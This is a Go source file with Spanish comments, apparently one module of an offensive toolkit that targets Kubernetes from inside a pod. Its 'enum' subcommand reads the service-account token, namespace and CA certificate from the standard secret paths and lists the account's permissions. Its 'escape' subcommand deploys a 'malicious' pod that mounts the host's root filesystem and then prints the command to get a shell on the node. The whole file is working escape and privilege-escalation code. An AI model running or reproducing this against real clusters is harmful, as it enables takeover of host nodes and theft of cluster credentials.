// FICHERO: k8s.go
package main

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"

	"github.com/spf13/cobra"
)

// k8sInfo almacena la información esencial para interactuar con la API de K8s desde un pod.
type k8sInfo struct {
	apiHost    string
	apiPort    string
	token      string
	namespace  string
	caCert     []byte
	httpClient *http.Client
}

func NewK8sCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "k8s",
		Short: "Ejecuta módulos de reconocimiento y explotación en entornos Kubernetes",
		Long:  "Contiene herramientas para auditar el entorno de un pod y intentar escapar al nodo anfitrión.",
	}
	cmd.AddCommand(newEnumK8sCmd())
	cmd.AddCommand(newEscapeK8sCmd())
	return cmd
}

// --- SUBCOMANDO: enum ---

func newEnumK8sCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "enum",
		Short: "Enumera los permisos del Service Account del pod actual",
		Long:  "Detecta si se está ejecutando en un pod, extrae el token y pregunta a la API de K8s qué acciones tiene permitidas.",
		Run: func(cmd *cobra.Command, args []string) {
			runEnumK8s()
		},
	}
}

func runEnumK8s() {
	log.Println("Iniciando enumeración del entorno Kubernetes desde el pod...")
	info, err := getK8sInfo()
	if err != nil {
		log.Fatalf("Error: No se pudo obtener la información del entorno Kubernetes. ¿Estás seguro de que estás en un pod? Causa: %v", err)
	}

	fmt.Println("\n--- ENTORNO KUBERNETES DETECTADO ---")
	fmt.Printf("API Server: https://%s:%s\n", info.apiHost, info.apiPort)
	fmt.Printf("Namespace:  %s\n", info.namespace)
	fmt.Printf("Token:      %s...\n", info.token[:15])
	fmt.Println("------------------------------------")

	// Usar la API SelfSubjectRulesReview para listar nuestros propios permisos
	review := map[string]interface{}{
		"apiVersion": "authorization.k8s.io/v1",
		"kind":       "SelfSubjectRulesReview",
		"spec": map[string]interface{}{
			"namespace": info.namespace,
		},
	}
	body, _ := json.Marshal(review)
	respBody, err := info.k8sAPICall("POST", "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", body)
	if err != nil {
		log.Fatalf("Error al revisar los permisos: %v", err)
	}

	// Parsear y mostrar los permisos de forma legible
	var rulesReview map[string]interface{}
	json.Unmarshal(respBody, &rulesReview)
	
	status := rulesReview["status"].(map[string]interface{})
	resourceRules := status["resourceRules"].([]interface{})

	fmt.Println("\n--- PERMISOS DEL SERVICE ACCOUNT ---")
	for _, r := range resourceRules {
		rule := r.(map[string]interface{})
		verbs := rule["verbs"]
		resources := rule["resources"]
		apiGroups := rule["apiGroups"]
		fmt.Printf("Puede %v en %v (APIGroups: %v)\n", verbs, resources, apiGroups)
	}
	fmt.Println("----------------------------------")
	log.Println("Enumeración completada. Revisa si tienes permisos para 'create' 'pods'.")
}

// --- SUBCOMANDO: escape ---

func newEscapeK8sCmd() *cobra.Command {
	var podName string
	return &cobra.Command{
		Use:   "escape",
		Short: "Intenta escapar del pod creando un pod privilegiado",
		Long:  `Crea un nuevo pod en el mismo nodo que monta el sistema de archivos raíz ("/") del anfitrión. Requiere permisos para crear pods.`,
		Run: func(cmd *cobra.Command, args []string) {
			runEscapeK8s(podName)
		},
	}
}

func runEscapeK8s(podName string) {
	log.Println("Intentando escapar del pod...")
	info, err := getK8sInfo()
	if err != nil {
		log.Fatalf("Error: No se pudo obtener la información del entorno Kubernetes: %v", err)
	}

	// Manifiesto del pod malicioso
	maliciousPodManifest := fmt.Sprintf(`{
		"apiVersion": "v1",
		"kind": "Pod",
		"metadata": {
			"name": "%s"
		},
		"spec": {
			"containers": [{
				"name": "hacker-container",
				"image": "alpine",
				"command": ["/bin/sh", "-c", "sleep 3600"],
				"volumeMounts": [{
					"name": "host-root-volume",
					"mountPath": "/host"
				}]
			}],
			"volumes": [{
				"name": "host-root-volume",
				"hostPath": {
					"path": "/"
				}
			}]
		}
	}`, podName)

	log.Printf("Desplegando pod de escape llamado '%s' en el namespace '%s'...", podName, info.namespace)
	endpoint := fmt.Sprintf("/api/v1/namespaces/%s/pods", info.namespace)
	_, err = info.k8sAPICall("POST", endpoint, []byte(maliciousPodManifest))
	if err != nil {
		log.Fatalf("Fallo al desplegar el pod. ¿Tienes los permisos correctos? Error: %v", err)
	}
	
	log.Println("\n¡ÉXITO! Pod de escape desplegado.")
	log.Println("Espera unos segundos a que se inicie y luego obtén un shell en el nodo anfitrión con:")
	fmt.Printf("  kubectl exec -it %s -- /bin/sh\n", podName)
	log.Println("Una vez dentro, el sistema de archivos del nodo estará en '/host'.")
}


// --- FUNCIONES DE UTILIDAD DE K8S ---

// getK8sInfo lee la información del entorno desde las rutas y variables estándar de un pod.
func getK8sInfo() (*k8sInfo, error) {
	host, port := os.Getenv("KUBERNETES_SERVICE_HOST"), os.Getenv("KUBERNETES_SERVICE_PORT")
	if host == "" || port == "" {
		return nil, fmt.Errorf("las variables de entorno KUBERNETES_SERVICE_HOST/PORT no están definidas")
	}

	token, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
	if err != nil {
		return nil, fmt.Errorf("no se pudo leer el token del service account: %w", err)
	}
	namespace, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
	if err != nil {
		return nil, fmt.Errorf("no se pudo leer el namespace: %w", err)
	}
	caCert, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/ca.crt")
	if err != nil {
		return nil, fmt.Errorf("no se pudo leer el certificado CA: %w", err)
	}

	// Crear un cliente HTTP que confíe en el certificado CA del cluster
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCert)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				RootCAs: caCertPool,
			},
		},
	}
	
	return &k8sInfo{
		apiHost: host,
		apiPort: port,
		token: string(token),
		namespace: string(namespace),
		caCert: caCert,
		httpClient: client,
	}, nil
}

// k8sAPICall es un wrapper para realizar llamadas autenticadas a la API de Kubernetes.
func (info *k8sInfo) k8sAPICall(method, path string, body []byte) ([]byte, error) {
	url := fmt.Sprintf("https://%s:%s%s", info.apiHost, info.apiPort, path)
	req, err := http.NewRequest(method, url, bytes.NewBuffer(body))
	if err != nil {
		return nil, err
	}
	
	req.Header.Add("Authorization", "Bearer "+info.token)
	req.Header.Add("Content-Type", "application/json")

	resp, err := info.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("la API respondió con un estado de error %d: %s", resp.StatusCode, string(respBody))
	}

	return respBody, nil
}